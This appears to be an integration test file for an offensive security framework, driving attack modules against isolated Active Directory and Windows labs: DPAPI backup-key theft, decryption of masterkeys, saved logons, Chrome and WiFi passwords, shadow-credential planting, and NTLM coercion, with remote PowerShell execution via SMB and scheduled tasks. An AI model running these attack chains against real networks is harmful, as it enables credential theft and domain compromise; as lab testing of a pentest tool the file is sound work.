            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("NT4WS$:nt4ws", out)
            self.assertNotIn("WS01$:", out.split("PRE-2000")[0])
            self.assertNotIn("WS01$:ws01 — PRE-2000", out)
            creds = console.store.creds()
            self.assertTrue(any(c["username"] == "NT4WS$"
                                and c["password"] == "nt4ws" for c in creds))
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestDpapiBackupKeyLab(unittest.TestCase):
    """dpapi_backupkey against the AD lab: BKRP cert + the private key
    via DRSUAPI replication (Samba's LSA can't do it), verified pair."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_backup_key_pair(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/dpapi_backupkey",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("backup key cert:", out)
            self.assertIn("private key verified against the backup "
                          "cert (RSA-2048)", out)
            loot = console.store.loot("dpapi-backupkey")
            self.assertEqual(len(loot), 1)
            self.assertIn("BEGIN CERTIFICATE", loot[0]["content"])
            self.assertIn("PRIVATE KEY", loot[0]["content"])
            # and the pair really matches: the looted private key's
            # public numbers equal the looted cert's
            from cryptography import x509 as cx509
            cert = cx509.load_pem_x509_certificate(
                loot[0]["content"].encode())
            from Cryptodome.PublicKey import RSA
            key_pem = loot[0]["content"][
                loot[0]["content"].index("-----BEGIN RSA PRIVATE KEY-----"):]
            key = RSA.import_key(key_pem.encode())
            self.assertEqual(key.n, cert.public_key().public_numbers().n)
        finally:
            console.store.close()


def dpapi_ca():
    from impacket.smbconnection import SMBConnection
    conn = SMBConnection(HOST, HOST, sess_port=4445, timeout=15)
    conn.login("Administrator", "P@ssw0rd123", "forge.local")
    return conn


def dpapi_wait_ca_ready():
    # the CA installs Windows, joins, installs AD CS (~30 min cold):
    # wait for its oem sentinel
    deadline = time.time() + 3600
    while time.time() < deadline:
        try:
            conn = dpapi_ca()
            buf = []
            conn.getFile("C$", r"OEM\CA-READY.txt", buf.append)
            raw = b"".join(buf)
            # PowerShell's Out-File writes UTF-16LE (BOM) on 5.1
            if raw.startswith(b"\xff\xfe"):
                text = raw[2:].decode("utf-16-le", "replace").strip()
            else:
                text = raw.decode("utf-8", "replace").strip()
            conn.close()
            if text == "ready":
                return
        except Exception:
            time.sleep(20)


def dpapi_put(conn, path, data):
    state = {"off": 0}

    def reader(size):
        chunk = data[state["off"]:state["off"] + size]
        state["off"] += len(chunk)
        return chunk

    conn.putFile("C$", path, reader)


def dpapi_run_ps1_as_admin(ps1_remote_path, task_name):
    """Register + start a scheduled task as FORGE\\Administrator via
    smb_exec: Register-ScheduledTask -Password gets a batch-logon user
    context with no interactive session — the way the DPAPI fixtures
    mint per-user state (masterkeys, credential files) on the CA."""
    regtask_ps1 = (
        f"$a = New-ScheduledTaskAction -Execute powershell.exe "
        f"-Argument '-NoProfile -ExecutionPolicy Bypass -File "
        f"{ps1_remote_path}'\r\n"
        f"Register-ScheduledTask -TaskName {task_name} -Action $a -User "
        f"'FORGE\\Administrator' -Password 'P@ssw0rd123' -Force\r\n"
        f"Start-ScheduledTask -TaskName {task_name}\r\n"
        f"Start-Sleep -Seconds 10\r\n"
        f"Unregister-ScheduledTask -TaskName {task_name} "
        f"-Confirm:$false\r\n")
    conn = dpapi_ca()
    try:
        dpapi_put(conn, r"Users\Public\regtask.ps1", regtask_ps1.encode())
    finally:
        conn.close()
    registry = ModuleRegistry(ROOT / "modules")
    registry.load()
    console = FrameworkConsole(registry, Store(":memory:"))
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            for command in (
                "use exploits/windows/smb_exec",
                f"set RHOSTS {HOST}",
                "set RPORT 4445",
                "set DOMAIN forge.local",
                "set USERNAME Administrator",
                "set PASSWORD P@ssw0rd123",
                # the console's shlex parsing eats backslashes on
                # set — double them so a literal \ reaches COMMAND
                "set COMMAND powershell -NoProfile -ExecutionPolicy "
                "Bypass -File C:\\\\Users\\\\Public\\\\regtask.ps1",
                "run",
            ):
                console.onecmd(command)
    finally:
        console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestDpapiMasterkeysLab(unittest.TestCase):
    """DPAPI stage 2, end to end: a scheduled task makes FORGE\\Administrator
    touch DPAPI on the CA (a REAL Windows-minted masterkey + probe blob —
    no synthetic crypto in the fixture), dpapi_backupkey pulls the domain
    backup key, dpapi_masterkeys unwraps the masterkey file it finds over
    SMB, and the recovered key decrypts the probe blob. The fixture is
    created here when missing (cold lab): files land over SMB, then
    smb_exec fires powershell as a cmd child — the exec shape that works
    on Server 2022."""

    PROTECT = r"Users\Administrator\AppData\Roaming\Microsoft\Protect"

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("domain")
        dpapi_wait_ca_ready()
        cls._ensure_fixture()

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("domain")

    @classmethod
    def _fixture_present(cls):
        try:
            conn = dpapi_ca()
        except Exception:
            return False
        try:
            buf = []
            conn.getFile("C$", r"Users\Public\probe.blob", buf.append)
            data = b"".join(buf)
            # must be a RAW DPAPI blob (version magic 01 00 00 00) — a
            # text-encoded artifact (ASCII hex/base64) is not a fixture
            if not data.startswith(b"\x01\x00\x00\x00"):
                return False
            for sid in cls._sid_dirs(conn):
                entries = [f.get_longname() for f in conn.listPath(
                    "C$", cls.PROTECT + "\\" + sid + r"\*")]
                if any(e.count("-") == 4 for e in entries):
                    return True
            return False
        except Exception:
            return False
        finally:
            conn.close()

    @classmethod
    def _sid_dirs(cls, conn):
        return [d.get_longname() for d in
                conn.listPath("C$", cls.PROTECT + r"\*")
                if d.get_longname().startswith("S-1-5-21")]

    @classmethod
    def _ensure_fixture(cls):
        if cls._fixture_present():
            return
        # CryptProtectData as FORGE\Administrator: the task's Protect
        # call mints the masterkey + blob
        probe_ps1 = (
            "Add-Type -AssemblyName System.Security\r\n"
            "$b = [Text.Encoding]::UTF8.GetBytes('stage2-probe')\r\n"
            "$e = [Security.Cryptography.ProtectedData]::Protect("
            "$b, $null, 'CurrentUser')\r\n"
            "[IO.File]::WriteAllBytes("
            "'C:\\Users\\Public\\probe.blob', $e)\r\n")
        conn = dpapi_ca()
        try:
            dpapi_put(conn, r"Users\Public\probe.ps1", probe_ps1.encode())
        finally:
            conn.close()
        dpapi_run_ps1_as_admin(r"C:\Users\Public\probe.ps1", "fz")
        # the task runs after the service fires it — poll for the artifacts
        deadline = time.time() + 120
        while time.time() < deadline:
            if cls._fixture_present():
                return
            time.sleep(5)
        raise AssertionError("DPAPI fixture did not materialize on the CA")

    def test_masterkey_unlocks_probe_blob(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/dpapi_backupkey",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                    "use auxiliary/attack/dpapi_masterkeys",
                    f"set RHOSTS {HOST}",
                    "set RPORT 4445",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("masterkey decrypted", out)
            loot = console.store.loot("masterkey")
            self.assertGreaterEqual(len(loot), 1)
            from impacket.dpapi import DPAPI_BLOB
            conn = dpapi_ca()
            try:
                raw = []
                conn.getFile("C$", r"Users\Public\probe.blob", raw.append)
                blob = DPAPI_BLOB(b"".join(raw))
            finally:
                conn.close()
            recovered = [bytes.fromhex(l["content"]) for l in loot
                         if len(l["content"]) == 128]
            # impacket's DPAPI_BLOB.decrypt takes the RAW masterkey (it
            # does the SHA1 + both session-key HMAC variants internally)
            plaintexts = [blob.decrypt(k) for k in recovered]
            self.assertIn(b"stage2-probe", plaintexts)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestDpapiCredentialsLab(unittest.TestCase):
    """DPAPI stage 3, end to end: a scheduled task runs cmdkey as
    FORGE\\Administrator on the CA (a REAL Credential Manager entry —
    no synthetic crypto), dpapi_backupkey pulls the domain backup key,
    dpapi_credentials unwraps the masterkey + credential file it finds
    over SMB, and the plaintext (target, username, secret) lands in
    creds + loot. Fixture is created here when missing (cold lab)."""

    CREDDIR = r"Users\Administrator\AppData\Roaming\Microsoft\Credentials"

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("domain")
        dpapi_wait_ca_ready()
        cls._ensure_fixture()

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("domain")

    @classmethod
    def _fixture_present(cls):
        try:
            conn = dpapi_ca()
        except Exception:
            return False
        try:
            entries = [f.get_longname() for f in
                       conn.listPath("C$", cls.CREDDIR + r"\*")
                       if not f.is_directory()]
            # credential files are hash-named (32-hex), not guids
            return len(entries) > 0
        except Exception:
            return False
        finally:
            conn.close()

    @classmethod
    def _ensure_fixture(cls):
        if cls._fixture_present():
            return
        # cmdkey as FORGE\Administrator mints the credential file (and
        # the masterkey that protects it, on first use)
        cred_ps1 = (
            "cmdkey /add:fileserver.forge.local "
            "/user:FORGE\\backupsvc /pass:BackupPass2024!\r\n")
        conn = dpapi_ca()
        try:
            dpapi_put(conn, r"Users\Public\cred.ps1", cred_ps1.encode())
        finally:
            conn.close()
        dpapi_run_ps1_as_admin(r"C:\Users\Public\cred.ps1", "fzcred")
        deadline = time.time() + 120
        while time.time() < deadline:
            if cls._fixture_present():
                return
            time.sleep(5)
        raise AssertionError("DPAPI credential fixture did not "
                             "materialize on the CA")

    def test_saved_logon_decrypted(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/dpapi_backupkey",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                    "use auxiliary/attack/dpapi_credentials",
                    f"set RHOSTS {HOST}",
                    "set RPORT 4445",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("fileserver.forge.local", out)
            self.assertIn("BackupPass2024!", out)
            loot = console.store.loot("credential")
            self.assertTrue(any("fileserver.forge.local" in l["label"]
                                for l in loot))
            creds = console.store.creds()
            self.assertTrue(any(c["username"] == "FORGE\\backupsvc"
                                and c["password"] == "BackupPass2024!"
                                for c in creds))
        finally:
            console.store.close()


def build_login_data(aes_key):
    """A real Login Data sqlite: one row whose password_value is a v10
    AES-256-GCM blob under aes_key — Chrome's format, minted host-side
    so the fixture needs no browser install."""
    import sqlite3
    from Cryptodome.Cipher import AES
    nonce = b"\x42" * 12
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(b"ChromePass2024!")
    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE logins (origin_url TEXT, "
                 "username_value TEXT, password_value BLOB, "
                 "date_created INTEGER)")
    conn.execute("INSERT INTO logins VALUES (?, ?, ?, 0)",
                 ("https://sso.forge.local", "chromeuser@forge.local",
                  b"v10" + nonce + ct + tag))
    data = conn.serialize()
    conn.close()
    return data


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestDpapiChromeLab(unittest.TestCase):
    """DPAPI stage 4, end to end: a scheduled task mints a REAL
    DPAPI-wrapped browser key + Local State as FORGE\\Administrator on
    the CA (no synthetic crypto in the wrap), the test plants a real
    v10 Login Data built with that key (no browser install needed),
    and dpapi_backupkey + dpapi_chrome recover the saved password."""

    UDATA = r"Users\Administrator\AppData\Local\Google\Chrome\User Data"

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("domain")
        dpapi_wait_ca_ready()
        cls._ensure_fixture()

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("domain")

    @classmethod
    def _read(cls, conn, path):
        try:
            buf = []
            conn.getFile("C$", path, buf.append)
            return b"".join(buf)
        except Exception:
            return None

    @classmethod
    def _fixture_present(cls):
        conn = None
        try:
            conn = dpapi_ca()
            return cls._read(conn, cls.UDATA + r"\Local State") and \
                cls._read(conn, cls.UDATA + r"\Default\Login Data")
        except Exception:
            return False
        finally:
            if conn is not None:
                conn.close()

    @classmethod
    def _ensure_fixture(cls):
        if cls._fixture_present():
            return
        conn = dpapi_ca()
        try:
            if cls._read(conn, cls.UDATA + r"\Local State") is None:
                # the task mints a random 32-byte key and writes a REAL
                # Local State: CryptProtectData(CurrentUser) is a real
                # DPAPI wrap with the user's masterkey. The raw key
                # lands in Public as fixture plumbing so the test can
                # encrypt the Login Data to match.
                chrome_ps1 = (
                    "Add-Type -AssemblyName System.Security\r\n"
                    "$key = New-Object byte[] 32\r\n"
                    "[Security.Cryptography.RandomNumberGenerator]::"
                    "Create().GetBytes($key)\r\n"
                    "$enc = [Security.Cryptography.ProtectedData]::"
                    "Protect($key, $null, 'CurrentUser')\r\n"
                    "$dir = \"$env:LOCALAPPDATA\\Google\\Chrome\\"
                    "User Data\"\r\n"
                    "New-Item -ItemType Directory -Force -Path "
                    "\"$dir\\Default\" | Out-Null\r\n"
                    "$b64 = [Convert]::ToBase64String("
                    "[Text.Encoding]::ASCII.GetBytes('DPAPI') + $enc)\r\n"
                    "$json = '{\"os_crypt\":{\"encrypted_key\":\"' "
                    "+ $b64 + '\"}}'\r\n"
                    "[IO.File]::WriteAllText(\"$dir\\Local State\", "
                    "$json)\r\n"
                    "[IO.File]::WriteAllBytes("
                    "'C:\\Users\\Public\\chrome.key', $key)\r\n")
                dpapi_put(conn, r"Users\Public\chrome.ps1",
                          chrome_ps1.encode())
                dpapi_run_ps1_as_admin(r"C:\Users\Public\chrome.ps1",
                                       "fzchrome")
            # the task runs after the service fires it — poll for the key
            key = None
            deadline = time.time() + 120
            while time.time() < deadline and key is None:
                key = cls._read(conn, r"Users\Public\chrome.key")
                if key is None:
                    time.sleep(5)
            if key is None:
                raise AssertionError("chrome fixture key did not "
                                     "materialize on the CA")
            # a real v10 Login Data, encrypted with the minted key
            dpapi_put(conn, cls.UDATA + r"\Default\Login Data",
                      build_login_data(key))
        finally:
            conn.close()
        if not cls._fixture_present():
            raise AssertionError("chrome fixture did not materialize "
                                 "on the CA")

    def test_browser_password_decrypted(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/dpapi_backupkey",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                    "use auxiliary/attack/dpapi_chrome",
                    f"set RHOSTS {HOST}",
                    "set RPORT 4445",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("sso.forge.local", out)
            self.assertIn("ChromePass2024!", out)
            loot = console.store.loot("credential")
            self.assertTrue(any("chrome credential" in l["label"]
                                and "sso.forge.local" in l["label"]
                                for l in loot))
            creds = console.store.creds()
            self.assertTrue(any(c["username"] == "chromeuser@forge.local"
                                and c["password"] == "ChromePass2024!"
                                for c in creds))
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestDpapiSystemLab(unittest.TestCase):
    """DPAPI stage 5 against the windows lab: the fixture mints a REAL
    WiFi profile XML whose keyMaterial is a LocalSystem-scope
    CryptProtectData wrap (smb_exec runs as SYSTEM — real system-scope
    DPAPI, no synthetic crypto), then dpapi_system pulls the hives via
    winreg, recovers DPAPI_SYSTEM, decrypts the SYSTEM masterkeys, and
    reads back the WiFi password."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("windows")
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
                conn.login("labadmin", "Labpass2024!")
                conn.close()
                break
            except Exception:
                time.sleep(5)
        else:
            cls.manager.down("windows")
            raise RuntimeError("windows lab guest SMB not up within 300s")
        cls._ensure_fixture()

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("windows")

    @classmethod
    def _fixture_present(cls):
        from impacket.smbconnection import SMBConnection
        try:
            conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
            conn.login("labadmin", "Labpass2024!")
        except Exception:
            return False
        try:
            buf = []
            conn.getFile(
                "C$", r"ProgramData\Microsoft\Wlansvc\Profiles\Interfaces"
                r"\{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}\ForgeLab.xml",
                buf.append)
            data = b"".join(buf)
            # the keyMaterial must carry a real blob — an empty element
            # means the wrap failed at fixture time (learned live)
            return b"<keyMaterial></keyMaterial>" not in data and \
                b"<keyMaterial>" in data
        except Exception:
            return False
        finally:
            conn.close()

    @classmethod
    def _ensure_fixture(cls):
        if cls._fixture_present():
            return
        from impacket.smbconnection import SMBConnection
        # a service IS SYSTEM, so CurrentUser wraps with the SYSTEM
        # account's masterkeys — the system-scope files this module
        # recovers. try/catch + a log: a silent Protect failure once
        # produced an empty keyMaterial and a useless fixture
        wifi_ps1 = (
            "try {\r\n"
            "  Add-Type -AssemblyName System.Security\r\n"
            "  $b = [Text.Encoding]::UTF8.GetBytes('WiFiPass2024!')\r\n"
            "  $e = [Security.Cryptography.ProtectedData]::Protect("
            "$b, $null, 'CurrentUser')\r\n"
            "  \"wrap ok: $($e.Length) bytes\" | Out-File "
            "C:\\Users\\Public\\wifi.log\r\n"
            "  $hex = ($e | ForEach-Object { $_.ToString('x2') }) "
            "-join ''\r\n"
            "  $dir = 'C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\"
            "Interfaces\\{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}'\r\n"
            "  New-Item -ItemType Directory -Force -Path $dir | "
            "Out-Null\r\n"
            "  $xml = \"<?xml version='1.0'?>\r\n"
            "<WLANProfile xmlns='http://www.microsoft.com/networking/"
            "WLAN/profile/v1'>\r\n"
            " <name>ForgeLabWiFi</name>\r\n"
            " <SSIDConfig><SSID><name>ForgeLabWiFi</name></SSID>"
            "</SSIDConfig>\r\n"
            " <MSM><security><sharedKey>\r\n"
            "   <keyType>passPhrase</keyType><protected>true</protected>\r\n"
            "   <keyMaterial>$hex</keyMaterial>\r\n"
            " </sharedKey></security></MSM>\r\n"
            "</WLANProfile>\"\r\n"
            "  [IO.File]::WriteAllText(\"$dir\\ForgeLab.xml\", $xml)\r\n"
            "  'ok' | Out-File C:\\Users\\Public\\wifi.done\r\n"
            "} catch {\r\n"
            "  $_ | Out-String | Out-File C:\\Users\\Public\\wifi.log\r\n"
            "}\r\n")
        conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=15)
        conn.login("labadmin", "Labpass2024!")
        data = wifi_ps1.encode()
        state = {"off": 0}

        def reader(size):
            chunk = data[state["off"]:state["off"] + size]
            state["off"] += len(chunk)
            return chunk

        try:
            conn.putFile("C$", r"Users\Public\wifi.ps1", reader)
        finally:
            conn.close()
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            with contextlib.redirect_stdout(io.StringIO()):
                for command in (
                    "use exploits/windows/smb_exec",
                    f"set RHOSTS {HOST}",
                    "set RPORT 1445",
                    "set USERNAME labadmin",
                    "set PASSWORD Labpass2024!",
                    "set COMMAND powershell -NoProfile -ExecutionPolicy "
                    "Bypass -File C:\\\\Users\\\\Public\\\\wifi.ps1",
                    "run",
                ):
                    console.onecmd(command)
        finally:
            console.store.close()
        deadline = time.time() + 90
        while time.time() < deadline:
            if cls._fixture_present():
                return
            time.sleep(5)
        raise AssertionError("DPAPI system fixture did not materialize "
                             "on the windows lab guest")

    def test_wifi_password_recovered(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/dpapi_system",
                    f"set RHOSTS {HOST}",
                    "set RPORT 1445",
                    "set USERNAME labadmin",
                    "set PASSWORD Labpass2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("DPAPI_SYSTEM keys recovered", out)
            self.assertIn("system masterkey decrypted", out)
            self.assertIn("WiFi ForgeLabWiFi: WiFiPass2024!", out)
            loot = console.store.loot("credential")
            self.assertTrue(any("wifi ForgeLabWiFi" in l["label"]
                                and l["content"] == "WiFiPass2024!"
                                for l in loot))
            creds = console.store.creds()
            self.assertTrue(any(c["username"] == "ForgeLabWiFi"
                                and c["password"] == "WiFiPass2024!"
                                for c in creds))
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestShadowCredsLab(unittest.TestCase):
    """shadow_creds against the AD lab: the fixture schema carries
    msDS-KeyCredentialLink, so the plant + restore are real. The TGT
    step meets the lab's PKINIT-less KDC and must refuse cleanly."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_plant_refusal_and_restore(self):
        def kcl_values():
            from impacket.ldap import ldap as impacket_ldap
            from impacket.ldap import ldapasn1
            conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
            conn.login("Administrator", "P@ssw0rd123", "forge.local")
            values = []
            for packet in conn.search(
                    searchBase="DC=forge,DC=local",
                    searchFilter="(sAMAccountName=analyst)",
                    attributes=["msDSKeyCredentialLink"]):
                if isinstance(packet, ldapasn1.SearchResultEntry):
                    attrs = {str(a["type"]): [str(v) for v in a["vals"]]
                             for a in packet["attributes"]}
                    values = attrs.get("msDSKeyCredentialLink", [])
            conn.close()
            return values

        before = kcl_values()
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/shadow_creds",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "set TARGET analyst",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("shadow credential planted", out)
            self.assertIn("PKINIT as analyst failed", out)
            self.assertIn(f"KCL restored ({len(before)} value(s))", out)
            # the cert PEM is looted even when the KDC can't issue
            loot = console.store.loot("cert")
            self.assertEqual(len(loot), 1)
            self.assertIn("BEGIN CERTIFICATE", loot[0]["content"])
            # restore really happened: the planted device value is gone
            # and the directory is back to exactly the pre-run set
            self.assertEqual(kcl_values(), before)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestCoerceLab(unittest.TestCase):
    """coerce against the windows lab's Server 2022: the classic methods
    fire (petitpotam through its unpatched-variant fallback), and the
    interfaces Server Core lacks report 'unavailable' cleanly."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("windows")
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=5)
                conn.login("labadmin", "Labpass2024!")
                conn.close()
                break
            except Exception:
                time.sleep(5)
        else:
            cls.manager.down("windows")
            raise RuntimeError("windows lab SMB not up within 300s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("windows")

    def test_methods_report_verdicts(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/coerce",
                    f"set RHOSTS {HOST}",
                    "set RPORT 1445",
                    "set DOMAIN .",
                    "set USERNAME labadmin",
                    "set PASSWORD Labpass2024!",
                    # slirp's host gateway: refuses fast (RST), so fired
                    # methods return at wire speed instead of hanging on
                    # a NetBIOS timeout
                    "set LISTENER 10.0.2.2",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("printerbug: FIRED", out)
            self.assertIn("petitpotam: FIRED", out)
            # DFS-N and FSRVP are server-role interfaces — absent on Core
            self.assertIn("dfscoerce: unavailable", out)
            self.assertIn("shadowcoerce: unavailable", out)
        finally:
            console.store.close()


if __name__ == "__main__":
    unittest.main()
